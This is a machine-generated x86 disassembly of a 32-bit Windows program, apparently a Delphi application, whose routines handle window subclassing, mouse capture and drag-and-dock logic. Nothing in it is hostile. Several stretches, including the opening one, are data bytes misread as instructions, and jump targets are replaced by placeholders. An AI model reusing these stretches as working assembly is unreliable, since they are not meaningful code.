add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
in al 0x83
inc ebx
add [ eax ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x73ffbc7a ] ah
mov [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov edx 0x7e004386
lea eax [ eax ]
adc al 0x86
jbe r-xdata
add [ esi - 0x78 ] bh
inc ebx
add [ ecx + eax ] bl
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
sub [ 0x41 ] dl
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax - 0x7b ] dh
inc ebx
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add al bh
rol [ ebx ] 0x14
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_438626
inc ebx
add [ ebx + eax * 8 + 0x43 ] bl
add [ eax ] cl
int 0x43
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ eax ] ah
rol [ ebx ] 0xa4
fiadd [ ebx ]
mov al [ 0x700043de ]
fild [ ebx ]
retn 0x43
sub_4389dc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x2400438a ]
add [ eax ] al
add [ eax - 0x5fffbc86 ] bl
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x41a2 ] cl
hlt
sub_438cb0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror [ ebp - 0x6f9bffbd ] 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl bl
lea eax [ ebx ]
push edx
nop
inc ebx
add [ edx + eax ] al
add [ eax ] al
enter 0x4385 0x0
pushfd
mov eax [ 0x34ac0041 ]
inc eax
add al dh
0x34b40041 0x40
adc [ edx ] 0x44
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0xb ] bl
inc ebx
add [ eax ] ah
inc edx
inc esp
add [ eax + 0xa ] cl
inc esp
add [ eax ] al
inc ebp
inc ecx
add ah bl
out dx eax
inc ebx
add al dh
retn
sub_438d0a
inc ebx
add ah bh
test [ ebx ] 0x8
int 0x43
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ esp + esi * 8 ] dh
inc ebx
add [ edi + 0x42500044 ] dh
inc esp
add [ ecx + eax * 2 - 0x3d9bffbc ] bl
inc ebx
add [ eax - 0x2fffbbc9 ] dh
aaa
inc esp
add al ch
xor al 0x44
add [ ecx + eax * 8 - 0x3e4fffbd ] ch
inc ebx
add [ ecx + esi * 8 - 0xe27ffbd ] ch
inc ebx
add al dh
int3
sub_439770
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x28004397
add [ eax ] al
add [ eax - 0x5fffbff0 ] ah
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_439860
inc eax
cwde
inc ebx
add [ edx - 0x68 ] cl
inc ebx
add [ eax + ebx * 4 + 0x43 ] dl
add ch al
xchg edi eax
inc ebx
add ch cl
xchg edi eax
inc ebx
add ch dl
xchg edi eax
inc ebx
add ch bl
xchg edi eax
inc ebx
add dl ch
xchg edi eax
inc ebx
add bh dh
xchg edi eax
inc ebx
add [ eax + ebx * 4 ] al
inc ebx
add [ ecx ] dl
cwde
inc ebx
add [ esi ] bl
cwde
inc ebx
add [ ebx ] ch
cwde
inc ebx
add [ eax ] bh
cwde
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0xffffffff9860e870 ] eax
inc ebx
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 4 ] al
inc ebx
add [ eax + 0x4398 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
cdq
inc ebx
add [ eax ] bh
add [ eax ] al
xchg esp eax
adc [ eax ] eax
mov al [ 0x44004034 ]
push edi
inc eax
add [ eax + 0x57 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax + 0x57 ] ah
inc eax
add [ edx + esi ] cl
inc eax
add [ ebx * 2 + 0x5d600044 ] cl
inc esp
add al bl
pop esi
inc esp
add al ch
pop esi
inc esp
add [ eax - 0x6fffbb9a ] ch
imul eax [ eax + eax - 0x30 ] 0xd400446b
insd
inc esp
add al bl
jb r-xdata
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
add [ eax + esi * 2 + 0x5ba40044 ] cl
inc esp
add [ edx + ebp * 2 + 0x44 ] ch
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jb r-xdata
add [ eax - 0xfffbbee ] al
add [ esi ] al
push esp
dec ebp
outsd
jne r-xdata
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0xb ] bl
inc ebx
add [ eax ] ah
inc edx
inc esp
add [ eax + 0xa ] cl
inc esp
add [ eax ] al
inc ebp
inc ecx
add ah bl
out dx eax
inc ebx
add al dh
retn
add [ eax ] al
in al 0x9a
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
0x2080043 0x0
lodsb [ esi ]
mov [ ebx ] es
pushfd
mov eax [ 0x34ac0041 ]
inc eax
add al dh
0x34b40041 0x40
adc [ edx ] 0x44
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add al al
jg r-xdata
mov eax eax
mov [ ecx + 0x43 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ecx + 0x280043 ] bl
add [ eax ] al
mov al [ 0xffffffffa0004010 ]
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
sahf
inc ecx
add [ ecx - 0xbcbffbf ] bh
inc ebx
add [ edi + 0x42500044 ] dh
inc esp
add [ ecx + eax * 2 - 0x3d9bffbc ] bl
inc ebx
add [ eax - 0x2fffbbc9 ] dh
aaa
inc esp
add al ch
xor al 0x44
add [ ecx + eax * 8 - 0x3e4fffbd ] ch
inc ebx
add [ ecx + esi * 8 - 0xe27ffbd ] ch
inc ebx
add al dh
int3
nop
fcomp [ ecx + 0x43 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4399ee
inc ebx
add ah bh
test [ ebx ] 0x8
int 0x43
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ esp + esi * 8 ] dh
inc ebx
add [ edi + 0x42500044 ] dh
inc esp
add [ ecx + eax * 2 - 0x3d9bffbc ] bl
inc ebx
add [ eax - 0x2fffbbc9 ] dh
aaa
inc esp
add al ch
xor al 0x44
add [ ecx + eax * 8 - 0x3e4fffbd ] ch
inc ebx
add [ ecx + esi * 8 - 0xe27ffbd ] ch
inc ebx
add al dh
int3
sub_439cc0
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_439d78
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_439dac
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404468
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_439d78
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_439e08
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_439fec
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c414
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_4044c8
mov eax edi
mov edx esi
call sub_403ffc
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43a030
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c414
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_4044c8
mov eax edi
mov edx esi
call sub_403ffc
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43a074
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
add eax [ esi + 0x44 ]
push eax
mov eax [ esp + 0x8 ]
add eax [ esi + 0x40 ]
push eax
push ebx
call SetWindowOrgEx
mov eax ebx
push eax
mov ecx eax
mov edx 0x14
mov eax [ esi + 0x30 ]
call sub_43e0d4
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43a0f0
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
jne r-xdata
mov eax ebx
call sub_443708
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_43a19c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_413f44
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_43a1d0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_443708
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_43a1f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026bc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_43a1d0
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_43a19c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_413de8
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_413fc0
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43a254
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_413e1c
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_413f44
mov edx 0x8
call sub_4026dc
inc esi
dec ebx
jne r-xdata
sub_43a288
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_413f44
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_43a19c
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_43a2ec
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_43a34c
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4031a8
mov edx esp
mov eax esi
call sub_40420c
add esp 0x100
pop esi
pop ebx
retn
sub_43a388
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43a452
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_43b4a8
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43ae30
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4069fc
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_43ae30
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_43b4a8
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43ae30
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_43b4a8
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_43a457
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45cc50
call sub_403a60
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_43b4a8
sub_43a4b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43a4da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a540
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a2ec
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_43a56c
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403454
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_43a598
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403454
xor edx edx
sub_43a5f0
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_445350
sub_43a610
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_445338
sub_43a634
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43a51c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d43c
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_424098
mov edx eax
mov eax esi
call sub_41d5b8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_43a698
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_43a6c8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a540
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43a724
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403454
pop edi
pop esi
pop ebp
retn 0x4
sub_43a748
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_43a76c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43a748
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43a748
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_43a828
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_43a894
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_43ace4
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_439dac
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_443708
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_443708
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_443708
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403454
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_43a828
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_443708
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_443708
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_43aa2c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_443708
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_443708
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_43aa70
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_43a288
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
